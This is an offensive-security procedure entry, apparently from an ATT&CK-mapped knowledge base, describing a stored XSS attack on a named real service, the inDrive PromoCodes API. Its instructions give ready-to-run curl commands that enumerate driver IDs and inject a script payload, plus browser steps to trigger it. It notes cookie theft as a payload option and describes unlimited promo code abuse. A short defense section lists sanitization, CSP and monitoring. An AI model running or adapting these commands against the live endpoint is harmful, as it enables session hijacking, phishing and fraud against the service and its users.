---
id: proc-inject-stored-xss-activationdate
tags:
  - xss
  - stored-xss
  - javascript-injection
  - api-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/inject-xss-payload-promocodes]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.042Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Trigger-Stored-XSS-via-ActivationDate

## Summary

This procedure exploits a stored XSS vulnerability in the inDrive PromoCodes API by injecting arbitrary JavaScript into the activationDate parameter for a specific driver ID. The payload is stored server-side and later reflected unsanitized when a victim queries the driver ID on the promo page, executing JavaScript in their browser for potential session hijacking or phishing.

## Description

The attack targets the POST endpoint at https://id.indrive.com/api/spreadsheet/promocodes, which lacks input sanitization on activationDate, allowing HTML/JS injection. An attacker sends a JSON payload with a targeted driver ID and malicious script, which is stored. When a victim visits https://promo.indrive.com/promocodes, enters the driver ID, and submits (e.g., clicks 'Проверить ID'), the server retrieves and displays the activationDate without escaping, triggering the XSS. Secondary impact includes infinite promo code usage by repeatedly calling the API to renew activations every 24 hours. This requires no authentication and works on public-facing web platforms.

## Requirements

1. Network access to inDrive domains (https://id.indrive.com and https://promo.indrive.com).
2. Knowledge of a valid driver ID (can be enumerated by testing small integers like 1-100).
3. Tool for sending HTTP POST requests (e.g., curl).

## Defense

Defensive measures and detection strategies:

- Implement server-side input validation and sanitization for activationDate (e.g., accept only date formats, escape HTML/JS).
- Use Content Security Policy (CSP) to restrict inline scripts on the promo page.
- Monitor API logs for suspicious payloads in activationDate (e.g., regex for <script> tags).
- Rate-limit API calls to prevent enumeration of driver IDs.

## Objectives

1. Store malicious JavaScript associated with a driver ID.
2. Trigger execution in a victim's browser via form submission.
3. Achieve arbitrary code execution for data theft or further attacks.

## Instructions

### Step 1: Enumerate Target Driver ID

**Context**: Identify a valid driver ID to associate the payload with, as invalid IDs may not trigger properly.

**Command** ([[commands/inject-xss-payload-promocodes]]):
```bash
# Test sequential IDs with a benign payload to find valid ones
for id in {1..100}; do
  curl -X POST https://id.indrive.com/api/spreadsheet/promocodes \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"$id\",\"activationDate\":\"test\"}" | grep -q "success" && echo "Valid ID: $id"
done
```

> This loops through potential IDs, sending test payloads and checking for success responses. Expected output: List of valid IDs (e.g., "Valid ID: 4").

### Step 2: Inject Malicious Payload

**Context**: Send the XSS payload to store it server-side for the targeted ID.

**Command** ([[commands/inject-xss-payload-promocodes]]):
```bash
curl -X POST https://id.indrive.com/api/spreadsheet/promocodes \
  -H "Content-Type: application/json" \
  -H "Origin: https://promo.indrive.com" \
  -H "Referer: https://promo.indrive.com/" \
  -d '{"id":"4","activationDate":"<script>alert(1)</script>"}'
```

> Submits the JSON with the script tag in activationDate. Expected output: HTTP 200 OK or similar success response from the API.

### Step 3: Trigger Payload as Victim

**Context**: Simulate or direct victim interaction to retrieve and execute the payload.

**Instructions**: Navigate to https://promo.indrive.com/promocodes in a browser, enter the driver ID (e.g., 4), and submit the form by clicking 'Проверить ID'. The reflected activationDate executes the JS.

> No command needed; browser-based. Expected output: JavaScript alert (or custom payload like document.cookie theft) executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-payload-promocodes]]

## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
